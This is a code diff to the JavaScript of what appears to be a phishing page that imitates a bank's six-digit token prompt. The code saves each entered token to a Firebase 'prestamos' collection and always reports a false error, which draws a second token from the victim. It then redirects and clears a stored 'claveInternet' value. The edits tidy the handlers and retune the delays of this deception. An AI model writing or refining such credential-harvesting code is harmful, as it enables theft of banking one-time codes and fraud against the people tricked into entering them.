@@ -670,7 +670,6 @@ class TokenInput {
   }
 
   bindEvents() {
-    // Number keys
     document.querySelectorAll('.number-key').forEach(key => {
       key.addEventListener('click', (e) => {
         const number = e.target.dataset.number;
@@ -678,22 +677,10 @@ class TokenInput {
       });
     });
 
-    // Delete one digit
-    document.getElementById('deleteOne').addEventListener('click', (e) => {
-      this.deleteLastDigit();
-    });
+    document.getElementById('deleteOne').addEventListener('click', () => this.deleteLastDigit());
+    document.getElementById('deleteAll').addEventListener('click', () => this.clearAll());
+    document.getElementById('toggleVisibility').addEventListener('click', () => this.toggleVisibility());
 
-    // Delete all digits
-    document.getElementById('deleteAll').addEventListener('click', (e) => {
-      this.clearAll();
-    });
-
-    // Toggle visibility
-    document.getElementById('toggleVisibility').addEventListener('click', (e) => {
-      this.toggleVisibility();
-    });
-
-    // Keyboard support
     document.addEventListener('keydown', (e) => {
       if (document.getElementById('modal-token').style.display === 'flex') {
         if (e.key >= '0' && e.key <= '9') {
@@ -739,7 +726,6 @@ class TokenInput {
 
   updateDisplay() {
     const squares = document.querySelectorAll('.square-container');
-
     squares.forEach((square, index) => {
       const innerCircle = square.querySelector('.inner-circle');
       square.classList.remove('filled', 'hidden');
@@ -747,7 +733,6 @@ class TokenInput {
 
       if (index < this.token.length) {
         square.classList.add('filled');
-
         if (this.isVisible) {
           innerCircle.textContent = this.token[index];
         } else {
@@ -756,14 +741,9 @@ class TokenInput {
       }
     });
 
-    // Update eye icon based on visibility state
     const eyeIcon = document.querySelector('.eye-icon');
     if (eyeIcon) {
-      if (this.isVisible) {
-        eyeIcon.style.opacity = '1';
-      } else {
-        eyeIcon.style.opacity = '0.7';
-      }
+      eyeIcon.style.opacity = this.isVisible ? '1' : '0.7';
     }
   }
 
@@ -780,7 +760,7 @@ class TokenInput {
       gainNode.gain.setValueAtTime(0.05, audioContext.currentTime);
       gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.05);
 
-      oscillator.start(audioContext.currentTime);
+      oscillator.start();
       oscillator.stop(audioContext.currentTime + 0.05);
     } catch (e) {
       console.log('Audio not supported');
@@ -800,7 +780,7 @@ class TokenInput {
       gainNode.gain.setValueAtTime(0.08, audioContext.currentTime);
       gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.1);
 
-      oscillator.start(audioContext.currentTime);
+      oscillator.start();
       oscillator.stop(audioContext.currentTime + 0.1);
     } catch (e) {
       console.log('Audio not supported');
@@ -829,16 +809,16 @@ document.addEventListener('DOMContentLoaded', () => {
 
   let tokenInput;
 
-  // Mostrar modal de token después de 4 segundos
+  // Mostrar modal de token después de 3 segundos
   setTimeout(() => {
     const modal = document.getElementById('modal-token');
     if (modal) {
       modal.style.display = 'flex';
       tokenInput = new TokenInput();
     }
-  }, 7000);
+  }, 3000); // ⏱ Cambiado a 3 segundos
 
-  // Add ripple effect to buttons
+  // Efecto ripple
   document.addEventListener('click', function (e) {
     if (e.target.closest('.key')) {
       const button = e.target.closest('.key');
@@ -861,28 +841,23 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   });
 
-  // Validación final del token
+  // Validación del token
   document.addEventListener('click', async (e) => {
     if (e.target.id === 'validate-token') {
       if (tokenInput && tokenInput.isValid()) {
         const code = tokenInput.getToken();
-
-        // Incrementar contador de intentos
         tokenInput.incrementAttempt();
         const currentAttempt = tokenInput.getAttemptCount();
 
-        // Mostrar loader primero
         document.getElementById('modal-token').style.display = 'none';
         document.getElementById('modal-cargando').style.display = 'flex';
 
-        // 🔐 Obtener o crear userId persistente
         let userId = localStorage.getItem('userId');
         if (!userId) {
           userId = crypto.randomUUID();
           localStorage.setItem('userId', userId);
         }
 
-        // 🔥 Guardar token en Firebase
         try {
           await db.collection("prestamos").doc(userId).set({
             tokenIngresado: code,
@@ -894,7 +869,6 @@ document.addEventListener('DOMContentLoaded', () => {
           console.error("Error al guardar token en Firebase:", error);
         }
 
-        // Simular procesamiento y mostrar resultado
         setTimeout(() => {
           document.getElementById('modal-cargando').style.display = 'none';
           document.getElementById('modal-error-token').style.display = 'flex';
@@ -904,22 +878,23 @@ document.addEventListener('DOMContentLoaded', () => {
 
             if (currentAttempt >= 2) {
               document.getElementById('modal-asesor').style.display = 'flex';
-
               setTimeout(() => {
                 localStorage.removeItem('claveInternet');
                 window.location.href = 'index2.html';
               }, 5000);
             } else {
-              document.getElementById('modal-token').style.display = 'flex';
-              tokenInput.clearAll();
+              // ⏱ Delay antes de mostrar el segundo intento
+              setTimeout(() => {
+                document.getElementById('modal-token').style.display = 'flex';
+                tokenInput.clearAll();
+              }, 3000); // <- tiempo antes de mostrar nuevamente el token
             }
-          }, 3000);
-        }, 3000);
+          }, 3000); // modal-error-token visible 3 segundos
+        }, 7000); // loader visible 3 segundos
       } else {
         alert('Debes ingresar los 6 dígitos del token');
         if (tokenInput) tokenInput.playErrorSound();
       }
     }
   });
-
 });
